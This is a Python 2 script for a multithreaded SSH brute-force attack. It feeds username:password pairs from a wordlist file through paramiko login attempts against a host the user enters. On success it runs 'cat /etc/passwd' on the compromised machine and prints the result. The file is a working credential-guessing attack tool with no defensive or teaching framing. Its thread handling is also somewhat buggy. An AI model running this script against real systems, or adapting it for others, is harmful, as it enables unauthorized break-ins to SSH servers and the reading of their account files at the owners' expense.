#!/usr/bin/python


# importing modules needed
import paramiko                 # for ssh client 
import sys                      # system implementations
import time                     # effiency implemantations
import Queue                    # for keeping track of tasks
import threading                # for spawning slave threads

# global settings
config = {
            "ssh_server_default_max_startup"     : 10,
            "ssh_server_default_max_session"     : 10,
            "ssh_server_default_login_Gracetime" : 120,
            "num_of_attempts_per_thread"         : 4
        }

success = False

# class definition
class BruteForce_Worker(threading.Thread):
    def __init__(self, ssh, queue, threadnumber, targetIP):
        threading.Thread.__init__(self)         # initializing from original class
        self.ssh = ssh
        self.queue = queue                      # assigning queue
        self.threadnumber = threadnumber
        self.targetIP = targetIP

    def run(self):
        global success
        print '+' * 20
        print '[+] Thread ' + str(self.threadnumber) + ' is doing work'
        
        ssh_instance = self.ssh
        
        while True:
            if not success: 
                line = self.queue.get()
                user_pass = line.strip().split(':')
                bruteforce(ssh_instance, self.targetIP, user_pass)
                self.queue.task_done()
            else:
                close_queue(self.queue)

def close_queue(queue):
    while queue.empty() is False:
        task = queue.get()
        queue.task_done()

# function definition
def usage():
    print '#'*10
    print '[!] Usage: ./multithread-sshbrute.py [file-path]'
    print '[!] Example: ./multithread-sshbrute.py uname-pword.txt'
    print '#'*10
    print '[!] Exiting...'

def main(host, file_path):
    global config
    
    ssh_instance = ssh_client_setup()
    
    # we need to open up file and count up tasks
    tasks_init(ssh_instance, host, file_path, config['num_of_attempts_per_thread'])

    ssh_instance.close()
    print '[!] Exiting...'

def tasks_init(ssh, host, filePath, num_of_attempts_per_thread):
    # open up file to read
    fd = open(filePath, 'r')
    lines = fd.readlines()            # list format
    count = 1

    if len(lines) < (num_of_attempts_per_thread * 4):
        num_of_threads = 1                                      # thread count
        queues = queue_setup(num_of_threads, lines)             # setting up queue tasks
        t = thread_factory(ssh, queues[queues.keys()[0]], 1, host)         # setting up threads to work
        queues[queues.keys()[0]].join()                         # make sure this will block until all tasks are done

    else:
        num_of_threads = 4
        queues = queue_setup(num_of_threads, lines)
        for queue_name in queues:
            t = thread_factory(ssh, queues[queue_name], int(queue_name[10]), host)        # tenth element is the thread number
            queues[queue_name].join()

def queue_setup(num, lines):
    queue_obj = {}

    # populating queue obj
    for i in range(1, num + 1):
        name = 'queue_num_' + str(i)
        queue_obj[name] = Queue.Queue()
    
    # add in all the jobs to queue
    queues = jobadder(queue_obj, num, lines)
    
    # return to tasks init
    return queues

def jobadder(queue_obj, num, lines):     
    if num == 1:
        for line in lines:                           # adding all the lines to our only queue in queue obj
            queue_obj[queue_obj.keys()[0]].put(line)       
    else:                                           # num of queues equals to 4
        offset = len(lines) / 4
        for queue_name in queue_obj:
            if queue_name == 'queue_num_1':
                for line in lines[:offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_2':
                for line in lines[offset:offset+offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_3':
                for line in lines[offset+offset:offset+offset+offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_4':
                for line in lines[offset+offset+offset:]:
                    queue_obj[queue_name].put(line)

    return queue_obj
            
def thread_factory(ssh, queue, threadnumber, host):
    slave_thread = BruteForce_Worker(ssh, queue, threadnumber, host)
    slave_thread.setDaemon(True)
    slave_thread.start()

    return slave_thread


def ssh_client_setup():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("paramiko.log")

    return ssh

def bruteforce(ssh, host, user_pass):
    global success

    # assumming the user-pass file is of the form  username:password\n
    try: 
        print '[+] Trying to login using username: %s and password = %s' %(user_pass[0], user_pass[1])
        ssh.connect(host, username=user_pass[0], password=user_pass[1], banner_timeout=60, auth_timeout=60)

    except:         # sys.exc_info() returns a tuple about the exception, and element 1 is the value of it
        print '[-] %s while trying username: %s, and password: %s' %(sys.exc_info()[1], user_pass[0], user_pass[1])
    else:
        success = True
        print '[+] Successfully logged in using username: %s, and password: %s' %(user_pass[0], user_pass[1])
        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')      # the command could technically be an input from cmdline
                
        for line in stdout.readlines():
            print line.strip()


# script execution
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)
    hostname_ip = raw_input('[+] Hostname/IP: ')
    main(hostname_ip, sys.argv[1])
    sys.exit(0)

